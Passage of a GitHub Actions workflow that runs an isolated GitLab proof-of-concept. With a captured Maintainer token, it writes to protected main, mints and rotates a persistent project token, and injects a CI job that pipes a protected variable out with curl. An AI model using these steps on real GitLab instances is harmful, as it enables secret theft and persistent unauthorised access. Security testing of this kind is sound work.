name: Owned NuGet group scheduled protected CI consequence probe

on:
  workflow_dispatch:
  push:
    branches:
      - pa30-rank23-l108-scheduled-ci-20261128

permissions:
  contents: read

jobs:
  downstream-write:
    runs-on: ubuntu-24.04
    timeout-minutes: 50
    steps:
      - name: Check isolated runner capacity
        shell: bash
        run: |
          set -euo pipefail
          df -h /
          free -h
          available_kib=$(df --output=avail -k / | tail -n 1)
          test "$available_kib" -ge 9000000

      - name: Install supported .NET SDK
        uses: actions/setup-dotnet@v5
        with:
          dotnet-version: 11.0.100

      - name: Start ephemeral GitLab CE 19.6.2
        shell: bash
        run: |
          set -euo pipefail
          root_password=$(openssl rand -hex 24)
          echo "::add-mask::$root_password"
          docker run --detach --rm --name l108-owned-gitlab \
            --shm-size 512m \
            --publish 127.0.0.1:8929:8929 \
            --env GITLAB_ROOT_PASSWORD="$root_password" \
            --env GITLAB_OMNIBUS_CONFIG="external_url 'http://127.0.0.1:8929'; prometheus_monitoring['enable'] = false;" \
            gitlab/gitlab-ce:19.6.2-ce.0 >/dev/null
          ready=0
          for attempt in $(seq 1 120); do
            if curl --silent --fail --output /dev/null \
              http://127.0.0.1:8929/users/sign_in; then
              ready=1
              break
            fi
            if ! docker inspect --format '{{.State.Running}}' l108-owned-gitlab | grep -qx true; then
              echo "GitLab container stopped before readiness"
              exit 1
            fi
            sleep 10
          done
          test "$ready" -eq 1
          docker exec l108-owned-gitlab gitlab-rails runner \
            "s=SecureRandom.alphanumeric(20); t=User.find_by_username('root').personal_access_tokens.create!(scopes: ['api', 'create_runner'], name: 'l108-ephemeral-root', expires_at: 2.days.from_now); t.set_token(s); t.save!; File.write('/tmp/l108-root-token', s)" >/dev/null
          docker cp l108-owned-gitlab:/tmp/l108-root-token "$RUNNER_TEMP/l108-root-token" >/dev/null
          chmod 600 "$RUNNER_TEMP/l108-root-token"
          echo "Ephemeral GitLab is ready; admin token retained only on this runner."

      - name: Test signed policy and protected A CI consequence
        shell: bash
        run: |
          set -euo pipefail
          python3 - <<'PY'
          import datetime
          import base64
          import hashlib
          import json
          import os
          import pathlib
          import re
          import secrets
          import shutil
          import subprocess
          import threading
          import textwrap
          import time
          import urllib.error
          import urllib.request
          from xml.sax.saxutils import escape

          base = "http://127.0.0.1:8929"
          temp = pathlib.Path(os.environ["RUNNER_TEMP"]) / "l108-probe"
          temp.mkdir(mode=0o700, exist_ok=True)
          root_token = (pathlib.Path(os.environ["RUNNER_TEMP"]) / "l108-root-token").read_text().strip()
          print("::add-mask::" + root_token)
          summary = {"gitlab_image": "gitlab/gitlab-ce:19.6.2-ce.0",
                     "sdk": subprocess.check_output(["dotnet", "--version"], text=True).strip(),
                     "controls": []}

          protected_bytes = b"INERT_OWNED_L108_" + secrets.token_bytes(24)
          protected_file = temp / "victim-only"
          protected_file.write_bytes(protected_bytes)
          protected_file.chmod(0o600)
          summary["protected_file"] = {"mode": oct(protected_file.stat().st_mode & 0o777),
                                       "sha256": hashlib.sha256(protected_bytes).hexdigest()}

          def request(method, path, data=None, token=None, basic=None):
              headers = {}
              if token:
                  headers["PRIVATE-TOKEN"] = token
              if basic:
                  headers["Authorization"] = "Basic " + base64.b64encode(
                      (basic[0] + ":" + basic[1]).encode()).decode()
              body = None
              if data is not None:
                  headers["Content-Type"] = "application/json"
                  body = json.dumps(data).encode()
              req = urllib.request.Request(base + path, data=body, headers=headers, method=method)
              try:
                  with urllib.request.urlopen(req, timeout=60) as response:
                      raw = response.read()
                      try:
                          return response.status, json.loads(raw)
                      except json.JSONDecodeError:
                          return response.status, raw.decode(errors="replace")
              except urllib.error.HTTPError as error:
                  return error.code, error.read().decode(errors="replace")

          def must(method, path, data=None, token=None, status=201):
              code, value = request(method, path, data, token)
              if code != status:
                  raise RuntimeError(f"{method} {path}: HTTP {code}; {str(value)[:350]}")
              return value

          suffix = os.environ["GITHUB_RUN_ID"]
          group = must("POST", "/api/v4/groups",
                       {"name": "Owned registry split " + suffix,
                        "path": "l108-owned-" + suffix, "visibility": "private"},
                       root_token)
          gid = group["id"]
          a = must("POST", "/api/v4/projects",
                   {"name": "trusted-a", "path": "trusted-a",
                    "namespace_id": gid, "visibility": "private",
                    "initialize_with_readme": True}, root_token)
          b = must("POST", "/api/v4/projects",
                   {"name": "lower-b", "path": "lower-b",
                    "namespace_id": gid, "visibility": "private"}, root_token)
          branch_code = None
          for _ in range(30):
              branch_code, branch_info = request(
                  "GET", f"/api/v4/projects/{a['id']}/repository/branches/main",
                  token=root_token)
              if branch_code == 200:
                  break
              time.sleep(1)
          summary["trusted_a_main_http"] = branch_code
          if branch_code != 200:
              raise RuntimeError("Trusted A main branch was not initialized")
          if not branch_info.get("protected"):
              must("POST", f"/api/v4/projects/{a['id']}/protected_branches",
                   {"name": "main", "push_access_level": 40,
                    "merge_access_level": 40}, root_token)
          protected_code, _ = request(
              "GET", f"/api/v4/projects/{a['id']}/protected_branches/main",
              token=root_token)
          summary["controls"].append({"case": "a_main_protected_ref",
                                      "http": protected_code})
          if protected_code != 200:
              raise RuntimeError("Trusted A main is not protected")
          users = {}
          for role in ("publisher", "reader", "victim"):
              user = must("POST", "/api/v4/users",
                          {"username": "l108" + role + suffix,
                           "name": "Owned " + role,
                           "email": "l108" + role + suffix + "@example.invalid",
                           "password": secrets.token_urlsafe(32),
                           "skip_confirmation": True},
                          root_token)
              users[role] = user
          must("POST", f"/api/v4/projects/{b['id']}/members",
               {"user_id": users["publisher"]["id"], "access_level": 30}, root_token)
          must("POST", f"/api/v4/groups/{gid}/members",
               {"user_id": users["reader"]["id"], "access_level": 20}, root_token)
          must("POST", f"/api/v4/projects/{a['id']}/members",
               {"user_id": users["victim"]["id"], "access_level": 40}, root_token)
          tokens = {}
          token_ids = {}
          for role, user in users.items():
              token_result = must(
                  "POST", f"/api/v4/users/{user['id']}/personal_access_tokens",
                  {"name": "l108-ephemeral-" + role, "scopes": ["api"],
                   "expires_at": (datetime.date.today() + datetime.timedelta(days=1)).isoformat()},
                  root_token)
              tokens[role] = token_result["token"]
              token_ids[role] = token_result["id"]
              print("::add-mask::" + tokens[role])
          summary["group_id"] = gid
          summary["projects"] = {"trusted_a": a["id"], "lower_b": b["id"]}
          summary["roles"] = {"publisher": "Developer on B only",
                              "reader": "Reporter on group",
                              "victim": "Maintainer on A only"}
          protected_bytes = tokens["victim"].encode()
          protected_file.write_bytes(protected_bytes)
          protected_file.chmod(0o600)
          summary["protected_file"] = {"mode": oct(protected_file.stat().st_mode & 0o777),
                                       "sha256": hashlib.sha256(protected_bytes).hexdigest(),
                                       "kind": "ephemeral owned GitLab A-Maintainer PAT"}

          ci_secret = "INERT_L108_CI_" + secrets.token_urlsafe(32)
          ci_secret_sha256 = hashlib.sha256(ci_secret.encode()).hexdigest()
          created_ci_code, created_ci_variable = request(
              "POST", f"/api/v4/projects/{a['id']}/variables",
              {"key": "A_ONLY_CI_MARKER", "value": ci_secret,
               "protected": True, "masked": True}, root_token)
          if (created_ci_code != 201 or
                  created_ci_variable.get("protected") is not True or
                  created_ci_variable.get("masked") is not True):
              raise RuntimeError(f"A-only CI variable setup failed: HTTP {created_ci_code}")
          summary["ci_variable"] = {"key": "A_ONLY_CI_MARKER",
                                    "protected": True, "masked": True,
                                    "sha256": ci_secret_sha256}
          b_variable_code, _ = request(
              "GET", f"/api/v4/projects/{a['id']}/variables/A_ONLY_CI_MARKER",
              token=tokens["publisher"])
          summary["controls"].append({"case": "b_only_a_ci_variable_denied",
                                      "http": b_variable_code})
          if b_variable_code not in (403, 404):
              raise RuntimeError("B-only publisher could read A CI variable")

          runner_create_code, runner_result = request(
              "POST", "/api/v4/user/runners",
              {"runner_type": "project_type", "project_id": a["id"],
               "description": "owned-l108-protected-ci-" + suffix,
               "tag_list": "l108-owned-ci-" + suffix,
               "run_untagged": False, "access_level": "ref_protected"},
              root_token)
          if runner_create_code != 201 or not runner_result.get("token"):
              raise RuntimeError(f"A runner creation failed: HTTP {runner_create_code}")
          runner_token = runner_result["token"]
          print("::add-mask::" + runner_token)
          summary["a_project_runner"] = {"id": runner_result["id"],
                                         "scope": "project_type",
                                         "access_level": "ref_protected"}
          runner_dir = temp / "gitlab-runner"
          runner_dir.mkdir(mode=0o700, exist_ok=True)
          runner_config = runner_dir / "config.toml"
          runner_config.write_text(
              "concurrent = 1\ncheck_interval = 2\n"
              "[[runners]]\n"
              "  name = \"owned-l108-ci\"\n"
              "  url = \"http://127.0.0.1:8929\"\n"
              "  token = " + json.dumps(runner_token) + "\n"
              "  executor = \"shell\"\n"
              "  shell = \"bash\"\n")
          runner_config.chmod(0o600)
          subprocess.run(
              ["docker", "run", "--detach", "--rm", "--name",
               "l108-owned-ci-runner", "--network", "host", "--volume",
               str(runner_dir) + ":/etc/gitlab-runner",
               "--volume", os.environ["DOTNET_ROOT"] + ":/usr/share/dotnet:ro",
               "--env", "DOTNET_ROOT=/usr/share/dotnet",
               "--env", "DOTNET_SYSTEM_GLOBALIZATION_INVARIANT=1",
               "--env", "PATH=/usr/share/dotnet:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
               "gitlab/gitlab-runner:ubuntu-v19.6.1"],
              check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
              text=True)
          runner_online = False
          for _ in range(45):
              runner_code, runner_info = request(
                  "GET", f"/api/v4/runners/{runner_result['id']}",
                  token=root_token)
              if runner_code == 200 and runner_info.get("status") == "online":
                  runner_online = True
                  break
              time.sleep(2)
          summary["controls"].append({"case": "a_project_runner_online",
                                      "http": runner_code,
                                      "online": runner_online})
          if not runner_online:
              raise RuntimeError("Owned A project runner did not become online")
          mounted_sdk = subprocess.run(
              ["docker", "exec", "l108-owned-ci-runner", "dotnet", "--version"],
              capture_output=True, text=True, timeout=30)
          summary["controls"].append({"case": "a_runner_mounted_sdk",
                                      "exit": mounted_sdk.returncode,
                                      "version": mounted_sdk.stdout.strip()})
          if mounted_sdk.returncode or mounted_sdk.stdout.strip() != "11.0.100":
              raise RuntimeError("A runner lacks exact mounted SDK: " + mounted_sdk.stderr[-300:])

          lower_events = pathlib.Path("/tmp") / ("l108-events-" + suffix + ".jsonl")
          retained_event = pathlib.Path("/tmp") / ("l108-retained-" + suffix + ".json")
          after_removal_event = pathlib.Path("/tmp") / ("l108-after-removal-" + suffix + ".json")
          rotation_event = pathlib.Path("/tmp") / ("l108-rotation-" + suffix + ".json")
          after_rotation_event = pathlib.Path("/tmp") / ("l108-after-rotation-" + suffix + ".json")
          after_token_revoke_event = pathlib.Path("/tmp") / ("l108-after-token-revoke-" + suffix + ".json")
          ci_variable_event = pathlib.Path("/tmp") / ("l108-ci-variable-" + suffix + ".json")
          ci_read_event = pathlib.Path("/tmp") / ("l108-ci-read-" + suffix + ".json")
          ci_write_event = pathlib.Path("/tmp") / ("l108-ci-write-" + suffix + ".json")
          project_token_file = pathlib.Path("/tmp") / ("l108-project-token-" + suffix)
          lower_port = pathlib.Path("/tmp") / ("l108-port-" + suffix)
          lower_server = pathlib.Path("/tmp") / ("l108-server-" + suffix + ".py")
          lower_server.write_text(textwrap.dedent(f"""
              import hashlib, json, os, pathlib, urllib.error, urllib.request
              from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
              BASE = {base!r}
              PROJECT = {a["id"]!r}
              EVENTS = pathlib.Path({str(lower_events)!r})
              RETAINED_EVENT = pathlib.Path({str(retained_event)!r})
              AFTER_REMOVAL_EVENT = pathlib.Path({str(after_removal_event)!r})
              ROTATION_EVENT = pathlib.Path({str(rotation_event)!r})
              AFTER_ROTATION_EVENT = pathlib.Path({str(after_rotation_event)!r})
              AFTER_TOKEN_REVOKE_EVENT = pathlib.Path({str(after_token_revoke_event)!r})
              CI_VARIABLE_EVENT = pathlib.Path({str(ci_variable_event)!r})
              CI_READ_EVENT = pathlib.Path({str(ci_read_event)!r})
              CI_WRITE_EVENT = pathlib.Path({str(ci_write_event)!r})
              PROJECT_TOKEN_FILE = pathlib.Path({str(project_token_file)!r})
              PORT = pathlib.Path({str(lower_port)!r})
              SUFFIX = {suffix!r}
              EXPIRES = {(datetime.date.today() + datetime.timedelta(days=2)).isoformat()!r}
              ROTATED_EXPIRES = {(datetime.date.today() + datetime.timedelta(days=5)).isoformat()!r}
              count = 0
              class Handler(BaseHTTPRequestHandler):
                  def do_POST(self):
                      global count
                      if self.path == "/ci-variable":
                          value = self.rfile.read(int(self.headers.get("Content-Length", "0")))
                          CI_VARIABLE_EVENT.write_text(json.dumps({{
                              "uid": os.getuid(),
                              "sha256": hashlib.sha256(value).hexdigest(),
                              "length": len(value)
                          }}))
                          self.send_response(204)
                          self.end_headers()
                          return
                      count += 1
                      token = self.rfile.read(int(self.headers.get("Content-Length", "0")))
                      path = "owned-l108-downstream-" + SUFFIX + "-" + str(count) + ".txt"
                      payload = json.dumps({{
                          "branch": "main",
                          "content": "INERT_L108_PROTECTED_WRITE_" + str(count),
                          "commit_message": "Owned L108 authorization control"
                      }}).encode()
                      req = urllib.request.Request(
                          BASE + f"/api/v4/projects/{{PROJECT}}/repository/files/{{path}}",
                          data=payload,
                          headers={{"PRIVATE-TOKEN": token.decode(),
                                   "Content-Type": "application/json"}},
                          method="POST")
                      try:
                          with urllib.request.urlopen(req, timeout=45) as response:
                              status = response.status
                      except urllib.error.HTTPError as error:
                          status = error.code
                      event = {{"uid": os.getuid(), "token_sha256": hashlib.sha256(token).hexdigest(),
                               "gitlab_write_http": status, "path": path}}
                      if count == 3:
                          mint_payload = json.dumps({{
                              "name": "owned-l108-retained-" + SUFFIX,
                              "scopes": ["api"], "access_level": 40,
                              "expires_at": EXPIRES
                          }}).encode()
                          mint_request = urllib.request.Request(
                              BASE + f"/api/v4/projects/{{PROJECT}}/access_tokens",
                              data=mint_payload,
                              headers={{"PRIVATE-TOKEN": token.decode(),
                                       "Content-Type": "application/json"}},
                              method="POST")
                          try:
                              with urllib.request.urlopen(mint_request, timeout=45) as response:
                                  mint_status = response.status
                                  minted = json.load(response)
                          except urllib.error.HTTPError as error:
                              mint_status = error.code
                              minted = {{}}
                          event["project_token_create_http"] = mint_status
                          if mint_status == 201 and minted.get("token"):
                              project_token = minted["token"]
                              PROJECT_TOKEN_FILE.write_text(project_token)
                              PROJECT_TOKEN_FILE.chmod(0o600)
                              event["project_token_sha256"] = hashlib.sha256(
                                  project_token.encode()).hexdigest()
                              event["project_token_id"] = minted.get("id")
                              event["project_token_expires_at"] = minted.get("expires_at")
                      with EVENTS.open("a") as out:
                          out.write(json.dumps(event) + "\\n")
                      self.send_response(204)
                      self.end_headers()
                  def do_GET(self):
                      if self.path == "/rotate-project-token" and PROJECT_TOKEN_FILE.exists():
                          old_token = PROJECT_TOKEN_FILE.read_text()
                          rotate_payload = json.dumps({{
                              "expires_at": ROTATED_EXPIRES
                          }}).encode()
                          rotate_request = urllib.request.Request(
                              BASE + f"/api/v4/projects/{{PROJECT}}/access_tokens/self/rotate",
                              data=rotate_payload,
                              headers={{"PRIVATE-TOKEN": old_token,
                                       "Content-Type": "application/json"}},
                              method="POST")
                          try:
                              with urllib.request.urlopen(rotate_request, timeout=45) as response:
                                  rotate_status = response.status
                                  rotated = json.load(response)
                          except urllib.error.HTTPError as error:
                              rotate_status = error.code
                              rotated = {{}}
                          rotation = {{"uid": os.getuid(), "rotation_http": rotate_status,
                                      "old_token_sha256": hashlib.sha256(
                                          old_token.encode()).hexdigest(),
                                      "requested_expires_at": ROTATED_EXPIRES}}
                          if rotate_status == 200 and rotated.get("token"):
                              new_token = rotated["token"]
                              PROJECT_TOKEN_FILE.write_text(new_token)
                              PROJECT_TOKEN_FILE.chmod(0o600)
                              rotation["new_token_sha256"] = hashlib.sha256(
                                  new_token.encode()).hexdigest()
                              rotation["rotated_token_id"] = rotated.get("id")
                              rotation["rotated_expires_at"] = rotated.get("expires_at")
                              old_path = "owned-l108-old-rotated-denied-" + SUFFIX + ".txt"
                              old_payload = json.dumps({{
                                  "branch": "main", "content": "INERT_OLD_ROTATED_DENIED",
                                  "commit_message": "Owned old-token denial control"
                              }}).encode()
                              old_request = urllib.request.Request(
                                  BASE + f"/api/v4/projects/{{PROJECT}}/repository/files/{{old_path}}",
                                  data=old_payload,
                                  headers={{"PRIVATE-TOKEN": old_token,
                                           "Content-Type": "application/json"}},
                                  method="POST")
                              try:
                                  with urllib.request.urlopen(old_request, timeout=45) as response:
                                      old_status = response.status
                              except urllib.error.HTTPError as error:
                                  old_status = error.code
                              rotation["old_token_write_http"] = old_status
                              rotation["old_token_denied_path"] = old_path
                          ROTATION_EVENT.write_text(json.dumps(rotation))
                          self.send_response(204)
                          self.end_headers()
                          return
                      if self.path == "/read-ci-variable" and PROJECT_TOKEN_FILE.exists():
                          project_token = PROJECT_TOKEN_FILE.read_text()
                          ci_request = urllib.request.Request(
                              BASE + f"/api/v4/projects/{{PROJECT}}/variables/A_ONLY_CI_MARKER",
                              headers={{"PRIVATE-TOKEN": project_token}}, method="GET")
                          try:
                              with urllib.request.urlopen(ci_request, timeout=45) as response:
                                  ci_status = response.status
                                  ci_response = json.load(response)
                          except urllib.error.HTTPError as error:
                              ci_status = error.code
                              ci_response = {{}}
                          ci_value = ci_response.get("value", "")
                          CI_READ_EVENT.write_text(json.dumps({{
                              "uid": os.getuid(), "http": ci_status,
                              "project_token_sha256": hashlib.sha256(
                                  project_token.encode()).hexdigest(),
                              "value_sha256": hashlib.sha256(ci_value.encode()).hexdigest(),
                              "length": len(ci_value)
                          }}))
                          self.send_response(204)
                          self.end_headers()
                          return
                      if self.path == "/write-ci-config" and PROJECT_TOKEN_FILE.exists():
                          project_token = PROJECT_TOKEN_FILE.read_text()
                          port = PORT.read_text().strip()
                          job_script = (
                              'printf %s "$A_ONLY_CI_MARKER" | '
                              'curl --silent --show-error --fail --output /dev/null '
                              '--request POST --data-binary @- '
                              'http://127.0.0.1:' + port + '/ci-variable')
                          ci_config = (
                              "stages: [witness]\\n"
                              "owned_l108_ci:\\n"
                              "  stage: witness\\n"
                              "  tags: [l108-owned-ci-" + SUFFIX + "]\\n"
                              "  script:\\n"
                              "    - " + json.dumps("set +x") + "\\n"
                              "    - " + json.dumps(job_script) + "\\n"
                              "    - " + json.dumps("echo OWNED_L108_CI_JOB") + "\\n")
                          ci_payload = json.dumps({{
                              "branch": "main", "content": ci_config,
                              "commit_message": "Owned L108 protected CI witness"
                          }}).encode()
                          ci_request = urllib.request.Request(
                              BASE + f"/api/v4/projects/{{PROJECT}}/repository/files/.gitlab-ci.yml",
                              data=ci_payload,
                              headers={{"PRIVATE-TOKEN": project_token,
                                       "Content-Type": "application/json"}},
                              method="POST")
                          try:
                              with urllib.request.urlopen(ci_request, timeout=45) as response:
                                  ci_write_status = response.status
                          except urllib.error.HTTPError as error:
                              ci_write_status = error.code
                          CI_WRITE_EVENT.write_text(json.dumps({{
                              "uid": os.getuid(), "http": ci_write_status,
                              "project_token_sha256": hashlib.sha256(
                                  project_token.encode()).hexdigest(),
                              "ci_config_sha256": hashlib.sha256(
                                  ci_config.encode()).hexdigest(),
                              "path": ".gitlab-ci.yml"
                          }}))
                          self.send_response(204)
                          self.end_headers()
                          return
                      if self.path not in ("/retained", "/after-member-removal",
                                           "/after-project-token-rotation",
                                           "/after-project-token-revoke") or not PROJECT_TOKEN_FILE.exists():
                          self.send_response(404)
                          self.end_headers()
                          return
                      project_token = PROJECT_TOKEN_FILE.read_text()
                      if self.path == "/retained":
                          path = "owned-l108-retained-" + SUFFIX + ".txt"
                          content = "INERT_L108_RETAINED_AFTER_REVOKE"
                          event_path = RETAINED_EVENT
                      elif self.path == "/after-member-removal":
                          path = "owned-l108-after-member-removal-" + SUFFIX + ".txt"
                          content = "INERT_L108_AFTER_MEMBER_REMOVAL"
                          event_path = AFTER_REMOVAL_EVENT
                      elif self.path == "/after-project-token-rotation":
                          path = "owned-l108-after-token-rotation-" + SUFFIX + ".txt"
